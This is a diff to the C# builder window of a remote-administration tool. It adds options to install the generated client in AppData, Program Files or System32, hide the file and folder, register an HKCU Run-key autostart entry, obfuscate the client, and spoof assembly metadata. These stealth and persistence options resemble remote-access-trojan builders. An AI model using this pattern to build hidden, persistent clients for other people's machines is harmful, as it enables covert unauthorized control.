@@ -14,14 +14,32 @@ namespace RemoteAdmin.Server
         private string serverPort = "5900";
         private string reconnectDelay = "30";
         private bool obfuscate = false;
-        private bool installOnStartup = true;
+
+        // Installation settings
+        private bool installClient = true;
+        private string installLocation = "AppData"; // AppData, ProgramFiles, or System
+        private string installSubDirectory = "SubDir";
+        private string installName = "Client";
+        private bool setFileHidden = false;
+        private bool setSubDirHidden = false;
+        private bool runOnStartup = true;
+        private string startupName = "Client";
+
+        // Assembly settings
         private string assemblyTitle = "Client Application";
         private string assemblyCompany = "Company Name";
         private string iconPath = "";
 
         // Current UI references
         private TextBox txtServerIP, txtServerPort, txtReconnectDelay;
-        private CheckBox chkObfuscate, chkInstallOnStartup;
+        private CheckBox chkObfuscate;
+
+        // Installation UI references
+        private CheckBox chkInstallClient, chkSetFileHidden, chkSetSubDirHidden, chkRunOnStartup;
+        private RadioButton rbAppData, rbProgramFiles, rbSystem;
+        private TextBox txtInstallSubDir, txtInstallName, txtStartupName;
+
+        // Assembly UI references
         private TextBox txtAssemblyTitle, txtAssemblyCompany, txtIconPath;
 
         public BuilderWindow()
@@ -61,7 +79,16 @@ namespace RemoteAdmin.Server
             if (chkObfuscate != null) obfuscate = chkObfuscate.IsChecked ?? false;
 
             // Save Installation Settings
-            if (chkInstallOnStartup != null) installOnStartup = chkInstallOnStartup.IsChecked ?? true;
+            if (chkInstallClient != null) installClient = chkInstallClient.IsChecked ?? true;
+            if (rbAppData != null && rbAppData.IsChecked == true) installLocation = "AppData";
+            if (rbProgramFiles != null && rbProgramFiles.IsChecked == true) installLocation = "ProgramFiles";
+            if (rbSystem != null && rbSystem.IsChecked == true) installLocation = "System";
+            if (txtInstallSubDir != null) installSubDirectory = txtInstallSubDir.Text;
+            if (txtInstallName != null) installName = txtInstallName.Text;
+            if (chkSetFileHidden != null) setFileHidden = chkSetFileHidden.IsChecked ?? false;
+            if (chkSetSubDirHidden != null) setSubDirHidden = chkSetSubDirHidden.IsChecked ?? false;
+            if (chkRunOnStartup != null) runOnStartup = chkRunOnStartup.IsChecked ?? true;
+            if (txtStartupName != null) startupName = txtStartupName.Text;
 
             // Save Assembly Settings
             if (txtAssemblyTitle != null) assemblyTitle = txtAssemblyTitle.Text;
@@ -140,32 +167,235 @@ namespace RemoteAdmin.Server
             contentArea.Children.Clear();
             var panel = new StackPanel();
 
-            panel.Children.Add(CreateHeader("Installation Settings"));
+            // Installation Location Section
+            panel.Children.Add(CreateHeader("Installation Location"));
 
-            chkInstallOnStartup = new CheckBox
+            chkInstallClient = new CheckBox
             {
-                Content = "Install on Startup",
-                IsChecked = installOnStartup,
-                Margin = new Thickness(0, 10, 0, 0)
+                Content = "Install Client",
+                IsChecked = installClient,
+                FontWeight = FontWeights.Bold,
+                Margin = new Thickness(0, 5, 0, 10)
             };
-            panel.Children.Add(chkInstallOnStartup);
-            panel.Children.Add(CreateHint("Automatically add the client to Windows startup registry"));
-            panel.Children.Add(CreateSpacer());
+            chkInstallClient.Checked += (s, e) => UpdateInstallationControls();
+            chkInstallClient.Unchecked += (s, e) => UpdateInstallationControls();
+            panel.Children.Add(chkInstallClient);
 
-            var infoText = new TextBlock
+            var installPanel = new StackPanel { Margin = new Thickness(20, 0, 0, 0) };
+
+            // Install Directory
+            installPanel.Children.Add(CreateLabel("Install Directory:"));
+
+            rbAppData = new RadioButton
             {
-                Text = "Additional installation features will be available in future versions:\n" +
-                       "• Service installation\n" +
-                       "• Custom installation path\n" +
-                       "• Auto-update functionality",
-                TextWrapping = TextWrapping.Wrap,
+                Content = "User Application Data",
+                IsChecked = installLocation == "AppData",
+                Margin = new Thickness(0, 5, 0, 5),
+                GroupName = "InstallLocation"
+            };
+            installPanel.Children.Add(rbAppData);
+
+            var appDataPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
+            appDataPath.Children.Add(new TextBlock
+            {
+                Text = "📁 ",
+                VerticalAlignment = VerticalAlignment.Center,
+                Margin = new Thickness(0, 0, 5, 0)
+            });
+            appDataPath.Children.Add(new TextBlock
+            {
+                Text = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Roaming"),
                 Foreground = System.Windows.Media.Brushes.Gray,
-                FontSize = 11,
-                Margin = new Thickness(0, 20, 0, 0)
+                FontSize = 10,
+                VerticalAlignment = VerticalAlignment.Center
+            });
+            installPanel.Children.Add(appDataPath);
+
+            rbProgramFiles = new RadioButton
+            {
+                Content = "Program Files",
+                IsChecked = installLocation == "ProgramFiles",
+                Margin = new Thickness(0, 5, 0, 5),
+                GroupName = "InstallLocation"
             };
-            panel.Children.Add(infoText);
+            installPanel.Children.Add(rbProgramFiles);
+
+            var programFilesPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
+            programFilesPath.Children.Add(new TextBlock
+            {
+                Text = "📁 ",
+                VerticalAlignment = VerticalAlignment.Center,
+                Margin = new Thickness(0, 0, 5, 0)
+            });
+            programFilesPath.Children.Add(new TextBlock
+            {
+                Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
+                Foreground = System.Windows.Media.Brushes.Gray,
+                FontSize = 10,
+                VerticalAlignment = VerticalAlignment.Center
+            });
+            installPanel.Children.Add(programFilesPath);
+
+            rbSystem = new RadioButton
+            {
+                Content = "System",
+                IsChecked = installLocation == "System",
+                Margin = new Thickness(0, 5, 0, 5),
+                GroupName = "InstallLocation"
+            };
+            installPanel.Children.Add(rbSystem);
+
+            var systemPath = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(20, 0, 0, 5) };
+            systemPath.Children.Add(new TextBlock
+            {
+                Text = "📁 ",
+                VerticalAlignment = VerticalAlignment.Center,
+                Margin = new Thickness(0, 0, 5, 0)
+            });
+            systemPath.Children.Add(new TextBlock
+            {
+                Text = Environment.GetFolderPath(Environment.SpecialFolder.System),
+                Foreground = System.Windows.Media.Brushes.Gray,
+                FontSize = 10,
+                VerticalAlignment = VerticalAlignment.Center
+            });
+            installPanel.Children.Add(systemPath);
+
+            installPanel.Children.Add(CreateSpacer(15));
+
+            // Install Subdirectory
+            installPanel.Children.Add(CreateLabel("Install Subdirectory:"));
+            txtInstallSubDir = CreateTextBox(installSubDirectory);
+            txtInstallSubDir.Width = 300;
+            txtInstallSubDir.HorizontalAlignment = HorizontalAlignment.Left;
+            installPanel.Children.Add(txtInstallSubDir);
+            installPanel.Children.Add(CreateSpacer(10));
+
+            // Install Name
+            installPanel.Children.Add(CreateLabel("Install Name:"));
+            var installNamePanel = new StackPanel { Orientation = Orientation.Horizontal };
+            txtInstallName = CreateTextBox(installName);
+            txtInstallName.Width = 250;
+            installNamePanel.Children.Add(txtInstallName);
+            installNamePanel.Children.Add(new TextBlock
+            {
+                Text = ".exe",
+                VerticalAlignment = VerticalAlignment.Center,
+                Margin = new Thickness(5, 0, 0, 0),
+                Foreground = System.Windows.Media.Brushes.Gray
+            });
+            installPanel.Children.Add(installNamePanel);
+            installPanel.Children.Add(CreateSpacer(10));
+
+            // File attributes
+            var attributesPanel = new StackPanel { Orientation = Orientation.Horizontal };
+            chkSetFileHidden = new CheckBox
+            {
+                Content = "Set file attributes to hidden",
+                IsChecked = setFileHidden,
+                Margin = new Thickness(0, 0, 20, 0)
+            };
+            attributesPanel.Children.Add(chkSetFileHidden);
+
+            chkSetSubDirHidden = new CheckBox
+            {
+                Content = "Set subdir attributes to hidden",
+                IsChecked = setSubDirHidden
+            };
+            attributesPanel.Children.Add(chkSetSubDirHidden);
+            installPanel.Children.Add(attributesPanel);
+
+            // Installation Location Preview
+            installPanel.Children.Add(CreateSpacer(15));
+            installPanel.Children.Add(CreateLabel("Installation Location Preview:"));
+            var previewBox = new TextBox
+            {
+                Text = GetInstallationPreview(),
+                IsReadOnly = true,
+                Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(40, 40, 40)),
+                Foreground = System.Windows.Media.Brushes.LightGreen,
+                FontFamily = new System.Windows.Media.FontFamily("Consolas"),
+                Padding = new Thickness(8),
+                Margin = new Thickness(0, 5, 0, 0)
+            };
+
+            // Update preview when any field changes
+            Action updatePreview = () => previewBox.Text = GetInstallationPreview();
+            rbAppData.Checked += (s, e) => updatePreview();
+            rbProgramFiles.Checked += (s, e) => updatePreview();
+            rbSystem.Checked += (s, e) => updatePreview();
+            txtInstallSubDir.TextChanged += (s, e) => updatePreview();
+            txtInstallName.TextChanged += (s, e) => updatePreview();
+
+            installPanel.Children.Add(previewBox);
+
+            panel.Children.Add(installPanel);
+
+            // Autostart Section
+            panel.Children.Add(CreateSpacer(20));
+            panel.Children.Add(CreateHeader("Autostart"));
+
+            chkRunOnStartup = new CheckBox
+            {
+                Content = "Run Client when the computer starts",
+                IsChecked = runOnStartup,
+                FontWeight = FontWeights.Bold,
+                Margin = new Thickness(0, 5, 0, 10)
+            };
+            chkRunOnStartup.Checked += (s, e) => UpdateStartupControls();
+            chkRunOnStartup.Unchecked += (s, e) => UpdateStartupControls();
+            panel.Children.Add(chkRunOnStartup);
+
+            var startupPanel = new StackPanel { Margin = new Thickness(20, 0, 0, 0) };
+            startupPanel.Children.Add(CreateLabel("Startup Name:"));
+            txtStartupName = CreateTextBox(startupName);
+            txtStartupName.Width = 300;
+            txtStartupName.HorizontalAlignment = HorizontalAlignment.Left;
+            startupPanel.Children.Add(txtStartupName);
+            startupPanel.Children.Add(CreateHint("Registry key name in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
+
+            panel.Children.Add(startupPanel);
 
             contentArea.Children.Add(panel);
+
+            // Initial state
+            UpdateInstallationControls();
+            UpdateStartupControls();
+        }
+
+        private string GetInstallationPreview()
+        {
+            string basePath = "";
+            if (installLocation == "AppData" || (rbAppData?.IsChecked == true))
+                basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            else if (installLocation == "ProgramFiles" || (rbProgramFiles?.IsChecked == true))
+                basePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+            else if (installLocation == "System" || (rbSystem?.IsChecked == true))
+                basePath = Environment.GetFolderPath(Environment.SpecialFolder.System);
+
+            string subDir = txtInstallSubDir?.Text ?? installSubDirectory;
+            string fileName = (txtInstallName?.Text ?? installName) + ".exe";
+
+            return System.IO.Path.Combine(basePath, subDir, fileName);
+        }
+
+        private void UpdateInstallationControls()
+        {
+            bool isEnabled = chkInstallClient?.IsChecked ?? installClient;
+
+            if (rbAppData != null) rbAppData.IsEnabled = isEnabled;
+            if (rbProgramFiles != null) rbProgramFiles.IsEnabled = isEnabled;
+            if (rbSystem != null) rbSystem.IsEnabled = isEnabled;
+            if (txtInstallSubDir != null) txtInstallSubDir.IsEnabled = isEnabled;
+            if (txtInstallName != null) txtInstallName.IsEnabled = isEnabled;
+            if (chkSetFileHidden != null) chkSetFileHidden.IsEnabled = isEnabled;
+            if (chkSetSubDirHidden != null) chkSetSubDirHidden.IsEnabled = isEnabled;
+        }
+
+        private void UpdateStartupControls()
+        {
+            bool isEnabled = chkRunOnStartup?.IsChecked ?? runOnStartup;
+            if (txtStartupName != null) txtStartupName.IsEnabled = isEnabled;
         }
 
         private void LoadAssemblySettings()
@@ -308,10 +538,24 @@ namespace RemoteAdmin.Server
                     ServerPort = port,
                     ReconnectDelay = delay,
                     Obfuscate = obfuscate,
-                    InstallOnStartup = installOnStartup,
+
+                    // Installation settings
+                    InstallClient = installClient,
+                    InstallLocation = installLocation,
+                    InstallSubDirectory = installSubDirectory,
+                    InstallName = installName,
+                    SetFileHidden = setFileHidden,
+                    SetSubDirHidden = setSubDirHidden,
+
+                    // Startup settings
+                    InstallOnStartup = runOnStartup,
+                    StartupName = startupName,
+
+                    // Assembly settings
                     AssemblyTitle = assemblyTitle,
                     AssemblyCompany = assemblyCompany,
                     IconPath = iconPath,
+
                     OutputPath = saveDialog.FileName
                 };
 
@@ -409,10 +653,7 @@ namespace RemoteAdmin.Server
 
             string[] possiblePaths = new[]
             {
-                Path.Combine(baseDir, "template", "RemoteAdmin.Client.exe"),
-                Path.Combine(baseDir, "RemoteAdmin.Client.exe"),
-                Path.Combine(baseDir, "client-template.exe"),
-                Path.Combine(baseDir, "..", "template", "RemoteAdmin.Client.exe")
+                Path.Combine(baseDir, "template", "Client.exe"),
             };
 
             foreach (var path in possiblePaths)
